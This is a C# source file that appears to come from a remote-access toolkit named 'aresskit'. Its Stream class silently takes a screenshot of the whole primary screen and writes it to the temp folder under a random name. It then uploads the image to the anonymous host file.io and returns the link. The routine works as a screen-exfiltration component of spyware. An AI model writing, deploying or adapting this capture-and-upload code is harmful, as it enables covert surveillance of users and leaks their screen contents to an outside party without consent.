﻿using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace aresskit
{
    // Thanks to: http://stackoverflow.com/a/18870847/5925502
    class Stream
    {
        public static string CaptureScreenshot()
        {
            string imagePath = default(string);
            Bitmap myImage = Stream.Capture(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            imagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
            myImage.Save(imagePath, ImageFormat.Png);

            dynamic json = JsonConvert.DeserializeObject(FileHandler.uploadFile(imagePath, "https://file.io/?expires=1w"));
            return json.link;
        }



        private static Bitmap Capture(int x, int y, int width, int height)
        {
            Bitmap screenShotBMP = new Bitmap(width, height, PixelFormat.Format32bppArgb);

            Graphics screenShotGraphics = Graphics.FromImage(screenShotBMP);

            screenShotGraphics.CopyFromScreen(new Point(x, y), Point.Empty, new Size(width, height), CopyPixelOperation.SourceCopy);
            screenShotGraphics.Dispose();

            return screenShotBMP;
        }
    }
}

